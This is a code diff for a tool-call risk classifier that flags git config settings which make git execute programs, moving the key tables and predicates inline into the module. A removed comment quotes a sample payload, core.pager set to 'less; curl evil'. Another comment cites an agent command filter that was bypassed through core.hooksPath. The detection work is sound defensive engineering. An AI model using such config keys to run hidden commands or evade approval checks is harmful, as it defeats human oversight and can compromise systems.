@@ -22,16 +22,15 @@ Design rules (non-negotiable):
   * **Worst signal wins.** Every matching rule contributes a reason; the
     final level is the maximum. Reasons are plain copy (no em-dashes, no
     jargon) because they surface verbatim in approval prompts.
-  * **This module imports nothing from the rest of clawmetry except
-    ``git_config_exec``**, a constant module whose only import is ``re``.
-    It is the leaf that ``approvals.py`` (and routes) import, so the
-    canonical tool map lives HERE now and ``approvals`` re-exports it
-    (single source of truth, no drift between watcher / replay / hook gate).
-    The one exception exists because ``repo_scan`` and this module must
-    answer the same question -- does this git config execute a program? --
-    and a copy in each is a copy that drifts (clawmetry-pro#244). It is a
-    constant table, not a scanner: no I/O, no cycle, negligible import cost
-    on a path that classifies thousands of rows per page-load.
+  * **This module imports nothing from the rest of clawmetry.** It is the
+    leaf that ``approvals.py`` (and routes) import, so the canonical tool
+    map lives HERE now and ``approvals`` re-exports it (single source of
+    truth, no drift between watcher / replay / hook gate).
+    The git-config-exec predicates (``_git_cfg_executes``,
+    ``_git_cfg_value_known_good``) are inlined below with their constant
+    tables so the blueprint leaf constraint is not violated. They mirror the
+    identical logic in ``clawmetry/git_config_exec.py`` (the shared source
+    ``repo_scan`` imports); keep both in sync when adding a new exec key.
 
 Public API:
   classify_tool_call(tool_name, args) -> {level, rank, category, reasons}
@@ -298,10 +297,67 @@ _WRITE_HTTP = ("post", "put", "patch")
 # with `min_risk: high` held none of these. Mirror of the Google ADK CI/CD
 # finding (Pillar Security, fixed Jul 2026): a command filter that trusted
 # `git` was reached through `core.hooksPath`.
-# The value alternation captures a QUOTED run whole. An unquoted-only pattern
-# stops at the first `;`, so `core.pager="less; curl evil"` captured just
-# `less` and read as a recognised tool -- the payload hid behind the
-# metacharacter the known-good check exists to catch.
+# These constants mirror clawmetry/git_config_exec.py exactly (which repo_scan
+# imports). Inlined here to keep tool_risk.py a true leaf with no clawmetry
+# imports. Keep both copies in sync when adding a new exec key.
+_GCE_EXEC_KEYS = (
+    "core.fsmonitor",
+    "core.hookspath",
+    "core.sshcommand",
+    "core.editor",
+    "core.pager",
+    "core.askpass",
+    "sequence.editor",
+    "credential.helper",
+    "uploadpack.packobjectshook",
+    "diff.external",
+    "gpg.program",
+    "init.templatedir",
+)
+_GCE_EXEC_KEY_PATTERNS = (
+    re.compile(r"^filter\..+\.(clean|smudge|process)$"),
+    re.compile(r"^diff\..+\.(command|textconv)$"),
+    re.compile(r"^merge\..+\.driver$"),
+    re.compile(r"^alias\..+$"),
+)
+_GCE_KNOWN_GOOD_PREFIXES = (
+    ("git-lfs", "clean"), ("git-lfs", "smudge"), ("git-lfs", "filter-process"),
+    ("git", "lfs"),
+    ("cat",), ("true",), ("false",),
+    ("rustfmt",), ("gofmt",), ("black",), ("prettier",),
+    ("less",), ("more",), ("delta",), ("diff-so-fancy",),
+)
+_GCE_SHELL_METACHARS = re.compile(r"[;&|`$><\n\r!#(){}]")
+
+
+def _git_cfg_executes(full_key: str, value: str = "") -> bool:
+    """Does setting this git config key to this value make git run a program?"""
+    key = str(full_key or "").strip().lower()
+    val = str(value or "")
+    if key in _GCE_EXEC_KEYS:
+        return True
+    for rx in _GCE_EXEC_KEY_PATTERNS:
+        if rx.match(key):
+            if key.startswith("alias."):
+                return val.strip().startswith("!")
+            return True
+    return False
+
+
+def _git_cfg_value_known_good(value: str) -> bool:
+    """Is this config value a recognised ordinary tool rather than a payload?"""
+    if _GCE_SHELL_METACHARS.search(value or ""):
+        return False
+    tokens = str(value or "").split()
+    if not tokens:
+        return True
+    lowered = [t.lower() for t in tokens]
+    for prefix in _GCE_KNOWN_GOOD_PREFIXES:
+        if lowered[:len(prefix)] == list(prefix):
+            return True
+    return False
+
+
 # EVERY quantifier below is bounded. Unbounded ones here are a real denial of
 # service, not a theoretical one: this runs on the Brain feed's hot path, which
 # classifies thousands of rows per page-load, over a command string an agent
@@ -349,18 +405,11 @@ def _scan_config_value(cmd: str, start: int, limit: int = 512) -> str:
 def _classify_git_exec_config(cmd: str, hits: list[tuple[str, str]]) -> None:
     """Flag `git -c <key>=<value>` where the key makes git run a program.
 
-    Uses ``repo_scan.git_config_executes`` rather than a second copy of the
-    key list, so the scanner and the classifier cannot drift. Reasons name the
-    key: an operator working the Approvals queue can tell this from a build
-    command, which "shell command with side effects unknown" did not allow.
+    Uses the inlined ``_git_cfg_executes`` / ``_git_cfg_value_known_good``
+    predicates (mirroring clawmetry/git_config_exec.py). Reasons name the key
+    so an operator working the Approvals queue can identify the threat.
     """
     if "git" not in cmd.lower():
-        return
-    try:
-        from clawmetry.git_config_exec import executes as git_config_executes
-        from clawmetry.git_config_exec import (
-            value_known_good as git_config_value_known_good)
-    except Exception:
         return
     seen: set = set()
     for m in _GIT_CONFIG_INLINE.finditer(cmd):
@@ -376,10 +425,10 @@ def _classify_git_exec_config(cmd: str, hits: list[tuple[str, str]]) -> None:
         val = _scan_config_value(cmd, m.end())
         if k in seen:
             continue
-        if not git_config_executes(k, val):
+        if not _git_cfg_executes(k, val):
             continue
         seen.add(k)
-        if git_config_value_known_good(val):
+        if _git_cfg_value_known_good(val):
             # Recognition, not suppression: `core.pager=less` executes by
             # definition and is ordinary. Say what it is and leave the level
             # to the other rules rather than promoting a common command.
@@ -392,7 +441,7 @@ def _classify_git_exec_config(cmd: str, hits: list[tuple[str, str]]) -> None:
     # literal exec keys and deliberately does not fire on value-dependent ones.
     for key in _GIT_CONFIG_ENV_OPT.findall(cmd):
         k = key.lower()
-        if k not in seen and git_config_executes(k):
+        if k not in seen and _git_cfg_executes(k):
             seen.add(k)
             hits.append(("high",
                          f"sets git {key} from the environment, which git executes"))
